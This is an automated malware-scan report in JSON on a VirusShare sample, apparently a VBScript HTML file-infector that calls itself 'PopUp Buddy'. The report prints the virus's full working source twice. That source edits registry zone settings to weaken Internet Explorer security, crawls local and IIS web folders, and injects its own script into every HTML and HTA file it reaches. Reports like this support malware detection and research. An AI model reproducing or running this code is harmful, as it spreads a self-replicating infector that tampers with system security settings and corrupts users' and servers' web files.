{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CreateObject": "May create an OLE object",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "Write": "May write to a file"
        },
        "macro": "<script language=\"\"VBScript\"\" id=\"\"dasScript\"\">\nOn Error Resume Next\n\nConst theMuch = 17\n\noRange = document.Scripts.NamedItem(\"dasScript\").Text\noRanged = document.Scripts.NamedItem(\"popbuddy\").Text\nSet WshShell = CreateObject(\"WScript.Shell\")\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nif location.port = \"\" Then\n\tWshShell.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\", 0, \"REG_DWORD\"\n\tWshShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\", 0, \"REG_DWORD\"\t\n\tthisFile = location.pathname\n\ttheLength = Len(thisFile)\n\tthisFileTxt = thisFile\n\tDo Until thePosition = 1\n\t\tthePosition = InStr(thisFileTxt, \"\\\")\n\t\tthePosition = thePosition + 1\n\t\tthisFileTxt = Mid(thisFileTxt, thePosition, theLength)\n\tLoop\n\ttheLength2 = Len(thisFileTxt)\n\ttheLength = theLength - theLength2\n\tthisFile = Mid(thisFile, 2, theLength - 1)\n\n\ttheFolder(thisFile)\n\ttheFolder(\"C:\\Inetpub\\wwwroot\")\n\ttheFolder(\"C:\\Program Files\\Microsoft FrontPage\\bin\")\nElse\n\t\nEnd If\n\n\nSub theFolder(theName)\nOn Error Resume Next\n\nIf FSO.FolderExists(theName) Then\n\tDo While FolderObj.IsRootFolder = False\n\t\tSet FolderObj = FSO.GetFolder(theName)\n\t\ttheName = FSO.GetParentFolderName(theName)\n\t\tSet FO = FolderObj.Files\n\t\tFor each NewFile in FO\n  \t\t\tExtName = Lcase(FSO.GetExtensionName(NewFile.Name))\n  \t\t\tSelect Case ExtName\n  \t\t\t\tCase \"hta\", \"html\", \"htm\"\n  \t\t\t\t\tSet MyFile = FSO.GetFile(NewFile.path)\n    \t\t\t\tSet kamb = MyFile.OpenAsTextStream(1)\n    \t\t\t\tFileCheck = kamb.read(theMuch)\n    \t\t\t\tIf FileCheck <> \"<!--popupbuddy-->\" Then\n    \t\t\t\t\tMakeFileSick(NewFile.path)\n    \t\t\t\tEnd if\n    \t\t\t\tkamb.close()  \t\t\t\t\n  \t\t\t\tCase Else\n  \t\t\tEnd Select\n  \t\tNext\n\tLoop\nElse\n\tExit sub\nEnd if\nEnd Sub\n\nSub MakeFileSick(TheFileName)\nOn Error Resume Next\n\nSet MyFileSick = FSO.GetFile(TheFileName)\nSet kamb = MyFileSick.OpenAsTextStream(1)\nFileContents = kamb.ReadAll()\nkamb.Close\n\nSet MyFileSick = FSO.GetFile(TheFileName)\nSet kamb = MyFileSick.OpenAsTextStream(2)\nkamb.WriteLine \"<!--popupbuddy-->\"\nkamb.Write FileContents\nkamb.WriteBlankLines(1) \nkamb.WriteLine \"<script language=\"\"VBScript\"\" id=\"\"dasScript\"\">\"\nkamb.Write oRange\nkamb.Write \"<\" & \"/\" & \"script>\"\nkamb.WriteBlankLines(1)\nkamb.WriteLine \"<script language=\"\"VBScript\"\" id=\"\"popbuddy\"\">\"\nkamb.Write oRanged\nkamb.Write \"<\" & \"/\" & \"script>\"\nkamb.Close\nEnd Sub\n</SCRIPT>\n\n<SCRIPT LANGUAGE=\"VBScript\" id=\"popbuddy\">\nset oPopup = window.createPopup()\nset oPopupBody = oPopup.document.body\n\noPopupBody.innerHTML = \"PopUp Buddy was here...\"\noPopup.show 300, 300, 200, 50, document.body\n</SCRIPT>"
    },
    "filename": "VirusShare_08c92aca87e5e96590451bcd327a6fdc",
    "filesize": 2696,
    "filetype": "HTML document, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "08c92aca87e5e96590451bcd327a6fdc",
        "sha1": "0dd56119a1463767df6d614d55ca2a0fd2a403ad",
        "sha256": "74c99c064dfafe071f5f0f26fe9121ff772eb262de4f2dedbab883a3d0a93a08"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<script language=\"\"VBScript\"\" id=\"\"dasScript\"\">",
            "On Error Resume Next",
            "Const theMuch = 17",
            "oRange = document.Scripts.NamedItem(\"dasScript\").Text",
            "oRanged = document.Scripts.NamedItem(\"popbuddy\").Text",
            "Set WshShell = CreateObject(\"WScript.Shell\")",
            "Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
            "if location.port = \"\" Then",
            "\tWshShell.Regwrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\", 0, \"REG_DWORD\"",
            "\tWshShell.RegWrite \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\", 0, \"REG_DWORD\"\t",
            "\tthisFile = location.pathname",
            "\ttheLength = Len(thisFile)",
            "\tthisFileTxt = thisFile",
            "\tDo Until thePosition = 1",
            "\t\tthePosition = InStr(thisFileTxt, \"\\\")",
            "\t\tthePosition = thePosition + 1",
            "\t\tthisFileTxt = Mid(thisFileTxt, thePosition, theLength)",
            "\tLoop",
            "\ttheLength2 = Len(thisFileTxt)",
            "\ttheLength = theLength - theLength2",
            "\tthisFile = Mid(thisFile, 2, theLength - 1)",
            "\ttheFolder(thisFile)",
            "\ttheFolder(\"C:\\Inetpub\\wwwroot\")",
            "\ttheFolder(\"C:\\Program Files\\Microsoft FrontPage\\bin\")",
            "Else",
            "End If",
            "Sub theFolder(theName)",
            "On Error Resume Next",
            "If FSO.FolderExists(theName) Then",
            "\tDo While FolderObj.IsRootFolder = False",
            "\t\tSet FolderObj = FSO.GetFolder(theName)",
            "\t\ttheName = FSO.GetParentFolderName(theName)",
            "\t\tSet FO = FolderObj.Files",
            "\t\tFor each NewFile in FO",
            "  \t\t\tExtName = Lcase(FSO.GetExtensionName(NewFile.Name))",
            "  \t\t\tSelect Case ExtName",
            "  \t\t\t\tCase \"hta\", \"html\", \"htm\"",
            "  \t\t\t\t\tSet MyFile = FSO.GetFile(NewFile.path)",
            "    \t\t\t\tSet kamb = MyFile.OpenAsTextStream(1)",
            "    \t\t\t\tFileCheck = kamb.read(theMuch)",
            "    \t\t\t\tIf FileCheck <> \"<!--popupbuddy-->\" Then",
            "    \t\t\t\t\tMakeFileSick(NewFile.path)",
            "    \t\t\t\tEnd if",
            "    \t\t\t\tkamb.close()  \t\t\t\t",
            "  \t\t\t\tCase Else",
            "  \t\t\tEnd Select",
            "  \t\tNext",
            "\tLoop",
            "Else",
            "\tExit sub",
            "End if",
            "End Sub",
            "Sub MakeFileSick(TheFileName)",
            "On Error Resume Next",
            "Set MyFileSick = FSO.GetFile(TheFileName)",
            "Set kamb = MyFileSick.OpenAsTextStream(1)",
            "FileContents = kamb.ReadAll()",
            "kamb.Close",
            "Set MyFileSick = FSO.GetFile(TheFileName)",
            "Set kamb = MyFileSick.OpenAsTextStream(2)",
            "kamb.WriteLine \"<!--popupbuddy-->\"",
            "kamb.Write FileContents",
            "kamb.WriteBlankLines(1) ",
            "kamb.WriteLine \"<script language=\"\"VBScript\"\" id=\"\"dasScript\"\">\"",
            "kamb.Write oRange",
            "kamb.Write \"<\" & \"/\" & \"script>\"",
            "kamb.WriteBlankLines(1)",
            "kamb.WriteLine \"<script language=\"\"VBScript\"\" id=\"\"popbuddy\"\">\"",
            "kamb.Write oRanged",
            "kamb.Write \"<\" & \"/\" & \"script>\"",
            "kamb.Close",
            "End Sub",
            "</SCRIPT>",
            "<SCRIPT LANGUAGE=\"VBScript\" id=\"popbuddy\">",
            "set oPopup = window.createPopup()",
            "set oPopupBody = oPopup.document.body",
            "oPopupBody.innerHTML = \"PopUp Buddy was here...\"",
            "oPopup.show 300, 300, 200, 50, document.body",
            "</SCRIPT>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.272603",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
